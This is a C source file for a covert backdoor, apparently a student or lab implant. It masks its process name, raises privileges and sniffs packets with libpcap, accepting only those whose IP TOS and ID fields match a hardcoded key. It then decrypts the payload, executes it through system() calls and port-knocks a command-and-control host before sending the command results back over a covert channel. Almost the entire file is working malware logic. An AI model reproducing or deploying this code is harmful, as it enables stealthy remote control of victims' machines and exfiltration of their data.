#include "main.h"

int main(int argc, char **argv){
    strcpy(argv[0], MASK);
    //change the UID/GID to 0 to raise privs
    setuid(0);
    setgid(0);
    pattern[0] = 8506;
    pattern[1] = 8507;
    Packetcapture();

    return 0;
}

int Packetcapture(){
    char errorbuffer[PCAP_ERRBUF_SIZE];
    struct bpf_program fp; //holds fp program info
    pcap_if_t *interface_list;
    pcap_t* interfaceinfo;
    bpf_u_int32 netp; //holds the ip

    //find the first network device capable of packet capture
    if(pcap_findalldevs(&interface_list,errorbuffer) == -1){
        printf("pcap_findalldevs: %s\n", errorbuffer);
        exit(0);
    }

    //open the network device
    //BUFSIZ is defined in pcap.h
    if((interfaceinfo = pcap_open_live(interface_list->name, BUFSIZ, 1, -1, errorbuffer)) == NULL){
        printf("pcap_open_live(): %s\n", errorbuffer);
        exit(0);
    }

    if(pcap_compile(interfaceinfo, &fp, FILTER(PORT), 0, netp) == -1){
        perror("pcap_comile");
    }

    if(pcap_setfilter(interfaceinfo, &fp) == -1){
        perror("pcap_setfilter");
    }

    pcap_loop(interfaceinfo, -1, ReadPacket, NULL);
    return 0;
}

void ReadPacket(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet){
    //grab the type of packet
    struct ether_header *ethernet;
    ethernet = (struct ether_header *)packet;
    u_int16_t type = ntohs(ethernet->ether_type);

    if(type == ETHERTYPE_IP){
        ParseIP(args, pkthdr, packet);
    }
}
void ParseIP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet){
    const struct my_ip* ip;
    u_int length = pkthdr->len;
    u_int hlen,off,version;
    int len;

    //skip past the ethernet header
    ip = (struct my_ip*)(packet + sizeof(struct ether_header));
    length-= sizeof(struct ether_header);

    if(length < sizeof(struct my_ip)){
        printf("Packet length is incorrect %d", length);
        exit(1);
    }

    len = ntohs(ip->ip_len);
    hlen = IP_HL(ip);
    version = IP_V(ip);
    off = ntohs(ip->ip_off);

    if(version != 4){
        perror("Unknown error");
        exit(1);
    } else if(hlen < 5){
        perror("Bad header length");
        exit(1);
    } else if(length < len){
        perror("Truncated IP");
        exit(1);
    } else if(ip->ip_p == IPPROTO_TCP){
        printf("Protocal: TCP\n");
        printf("IPID: %hu\n", ip->ip_id);
        printf("TOS: %u\n", ip->ip_tos);
        if(CheckKey(ip->ip_tos, ip->ip_id)){
            printf("Reading payload\n");
            ParseTCP(args, pkthdr, packet);
        } else {
            printf("Packet tossed wrong key\n");
        }
    }

}

bool CheckKey(u_char ip_tos, u_short ip_id){
    if(ip_tos == 'l' && ip_id == 'b'){
        return true;
    } else {
        return false;
    }
}

void ParseTCP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet){
    const struct sniff_tcp *tcp=0;
    const struct my_ip *ip;
    const char *payload;

    int size_ip;
    int size_tcp;
    int size_payload;

    printf("TCP Packet\n");

    ip = (struct my_ip*)(packet + 14);
    size_ip = IP_HL(ip)*4;

    tcp = (struct sniff_tcp*)(packet + 14 + size_ip);
    size_tcp = TH_OFF(tcp)*4;

    if(size_tcp < 20){
        perror("TCP: Control packet length is incorrect");
        exit(1);
    }

    printf("Source port: %d\n", ntohs(tcp->th_sport));
    printf("Destination port: %d\n", ntohs(tcp->th_dport));
    payload = (u_char *)(packet + 14 + size_ip + size_tcp);

    size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);

    if(size_payload > 0){
        printf("Payload (%d bytes):\n", size_payload);
        ParsePayload(payload, size_payload);
    }
}

void ParsePayload(const u_char *payload, int len){
    FILE *fp;
    unsigned char decryptedtext[BUFSIZE+16];
    int decryptedlen, cipherlen;

    if((fp = fopen(FILENAME, "wb+")) < 0){
        perror("fopen");
        exit(1);
    }
//    printf("Encrypted Payload size is: %lu\n", sizeof(payload));
    cipherlen = strlen((char*)payload);
//    printf("Encrypted Payload is: %s \n", payload);
    decryptedlen = decryptMessage((unsigned char*)payload, BUFSIZE+16, (unsigned char*)KEY, (unsigned char *)IV, decryptedtext);

    printf("Decrypted payload size: %d\n", decryptedlen);
    printf("Decrypted Payload is: %s \n", decryptedtext);
    if((fwrite(decryptedtext, strlen((const char*)decryptedtext), sizeof(char), fp)) <= 0){
        perror("fwrite");
        exit(1);
    }
    fclose(fp);
    system(CHMOD);
    system(CMD);
    system(IPTABLES(CNCIP));

    printf("COMMAND RECEIEVED \n");
    //sending the results back to the CNC
    char *srcip = INFECTEDIP;
    char *destip = CNCIP;
    unsigned short sport = SHPORT;
    unsigned short dport = SHPORT;
    unsigned char data[BUFSIZE] = "ls";
    printf("PORT KNOCKING\n");
    send_pattern(srcip, destip, sport, dport, data);
    printf("RETURNING RESULTS\n");
    send_results(srcip, destip, sport, dport, RESULT_FILE);
    system(TURNOFF(CNCIP));
    printf("\n");
    printf("\n");
    printf("Waiting for new command\n");
}

void send_pattern(char *sip, char *dip, unsigned short sport, unsigned short dport,unsigned char *data){
    unsigned short port = pattern[0];
    covert_send(sip, dip, sport, port, data, 2);
    port = pattern[1];
    covert_send(sip, dip, sport, port, data, 2);
}

